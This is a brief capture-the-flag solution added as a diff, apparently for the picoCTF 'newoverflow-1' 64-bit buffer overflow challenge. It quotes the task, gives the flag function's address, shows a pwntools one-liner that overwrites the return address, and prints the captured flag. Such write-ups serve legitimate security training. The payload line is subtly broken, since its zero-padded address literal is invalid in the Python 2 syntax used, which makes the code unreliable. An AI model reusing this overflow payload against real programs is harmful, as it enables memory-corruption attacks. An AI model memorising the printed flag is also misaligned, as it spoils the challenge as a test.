@@ -1,0 +1,7 @@
+Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this program. You can find it in /problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a on the shell server. Source.
+
+trying to jump to 0x0000000000400768
+
+python -c 'from pwn import *;print "A"*64+"BBBBBBBB" + p64(0000000000400768)' | ./vuln
+
+picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_d0b837aa}
